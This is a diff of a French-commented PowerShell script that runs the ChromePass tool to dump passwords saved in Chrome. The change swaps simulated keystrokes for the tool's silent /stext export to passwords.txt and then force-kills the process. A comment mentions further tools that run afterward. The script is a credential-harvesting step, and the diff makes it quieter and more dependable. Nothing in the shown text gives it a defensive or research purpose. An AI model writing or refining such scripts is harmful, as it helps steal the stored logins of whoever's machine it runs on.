@@ -41,18 +41,8 @@ Start-Sleep -Seconds 3
 
 # --- EXTRACTION CHROMEPASS VIA INTERACTION SIMULEE ---
 Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
-Start-Process -FilePath "$basePath\chromepass.exe" -WindowStyle Normal
-Start-Sleep -Seconds 2
-
-# Simuler les touches clavier : Ctrl+A (tout selectionner) puis Ctrl+S (enregistrer) puis taper le chemin et Entree
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.SendKeys]::SendWait("^a")
-Start-Sleep -Seconds 1
-[System.Windows.Forms.SendKeys]::SendWait("^s")
-Start-Sleep -Seconds 1
-[System.Windows.Forms.SendKeys]::SendWait("$basePath\passwords.txt{ENTER}")
-Start-Sleep -Seconds 2
-
+Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -NoNewWindow
+Start-Sleep -Seconds 4
 Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
 
 # Exécution des autres outils avec chemins absolus
